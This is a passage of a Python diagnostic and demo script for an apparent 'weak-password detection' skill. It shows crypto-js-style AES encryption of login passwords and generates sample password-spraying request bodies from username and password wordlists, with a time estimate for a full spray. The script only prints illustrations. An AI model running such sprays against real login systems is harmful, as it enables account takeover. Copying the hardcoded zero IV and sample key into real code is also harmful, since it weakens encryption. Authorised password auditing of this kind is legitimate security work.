def demo_aes_encrypt(plaintext="password123", key_hex="0123456789abcdef0123456789abcdef"):
    """演示 AES-CBC 加密 (crypto-js 默认模式)"""
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        import base64

        key = bytes.fromhex(key_hex)
        iv = bytes.fromhex("00000000000000000000000000000000")  # 示例 IV
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ct = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
        result = base64.b64encode(ct).decode()

        print(f"    明文: {green(repr(plaintext))}")
        print(f"    Key:  {yellow(key_hex[:16])}... (32字节, AES-256)")
        print(f"    密文: {yellow(result)}")
        return True
    except ImportError:
        print(f"    {red('pycryptodome 未安装，跳过 AES 演示')}")
        return False
    except Exception as e:
        print(f"    {red(f'AES 加密失败: {e}')}")
        return False


def demo_encryption():
    print(bold("\n[3] 加密演示"))
    print("─" * 50)

    print(f"\n  {cyan('RSA PKCS1v15')} (jsencrypt 库 — 最常见)")
    demo_rsa_encrypt("admin")
    print()
    demo_rsa_encrypt("123456")

    print(f"\n  {cyan('AES-256-CBC')} (crypto-js 库)")
    demo_aes_encrypt("password123")


# ─── 4. 载荷生成演示 ──────────────────────────────────────────────────────────
def demo_payload_generation():
    print(bold("\n[4] 载荷生成演示"))
    print("─" * 50)

    users_file = os.path.join(WORDLISTS_DIR, "usernames", "TOP241用户名.txt")
    pwds_file = os.path.join(WORDLISTS_DIR, "passwords", "TOP603密码.txt")

    def load_wordlist(path, limit=5):
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                return [line.strip() for line in f if line.strip()][:limit]
        except FileNotFoundError:
            return []

    users = load_wordlist(users_file)
    pwds = load_wordlist(pwds_file, limit=3)

    if not users or not pwds:
        print(f"  {red('字典文件不存在，跳过载荷演示')}")
        return

    print(f"\n  {'密码喷洒模式'} (每轮一个密码 × 所有用户名):")
    print(f"  {'用户名':<20} {'密码':<15} 数据包 (示意)")
    print(f"  {'─'*20} {'─'*15} {'─'*30}")
    for pwd in pwds:
        for user in users[:3]:
            payload = f"account={user}&password=<RSA({pwd})>"
            print(f"  {cyan(user):<20} {yellow(pwd):<15} {payload}")
        print()

    total = 241 * 603
    print(f"  完整字典 TOP241 × TOP603 = {total:,} 次请求")
    print(f"  按 10 并发 / 0.1s 间隔估算: 约 {total * 0.1 / 10 / 60:.0f} 分钟")


# ─── 主入口 ───────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="弱口令检测技能 — 诊断 & 演示工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--check",     action="store_true", help="仅检查环境依赖")
    parser.add_argument("--wordlists", action="store_true", help="仅显示字典统计")
    parser.add_argument("--encrypt",   action="store_true", help="仅演示加密方法")
    args = parser.parse_args()

    print(bold(cyan("=" * 55)))
    print(bold(cyan("  弱口令检测技能 (weak-pass-check) — 诊断工具")))
    print(bold(cyan("=" * 55)))
    print(f"  技能根目录: {SKILL_ROOT}")

    run_all = not any([args.check, args.wordlists, args.encrypt])

    if args.check or run_all:
        check_environment()

    if args.wordlists or run_all:
        show_wordlists()

    if args.encrypt or run_all:
        demo_encryption()

    if run_all:
        demo_payload_generation()

    print()


if __name__ == "__main__":
    main()
